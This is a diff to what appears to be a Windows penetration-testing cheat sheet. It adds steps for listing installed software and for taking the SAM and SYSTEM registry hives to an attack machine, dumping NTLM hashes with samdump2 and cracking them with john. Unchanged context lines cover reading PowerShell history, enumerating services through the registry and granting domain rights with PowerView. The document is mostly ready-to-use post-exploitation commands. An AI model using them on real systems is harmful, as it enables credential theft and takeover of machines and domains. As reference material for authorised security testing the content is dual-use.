@@ -83,6 +83,14 @@ Whoami Groups
 Read PowerShell History
 `type c:\users\username\appdata\roaming\microsoft\windows\powershell\psreadline\consolehost_history.txt`
 
+Enumerate Installed Software
+```
+dir "C:\Program Files"
+dir "C:\Program Files (x86)"
+
+Get version info from changelog files.
+```
+
 Enumerate Services (even when sc.exe is denied permission)
 `reg query "HKLM\System\CurrentControlSet\Services"`
 
@@ -139,4 +147,16 @@ Grant Domain User Privs via PowerView
 ```
 . .\PowerView.ps1
 add-objectacl -principalidentity username -credential $cred -rights privname
+```
+
+Get User NTLM Hashes via Registry Hives
+```
+Copy the following files to the attack box:
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+
+Dump the hashes:
+samdump2 SYSTEM SAM
+
+(Crack with john, etc.)
 ```
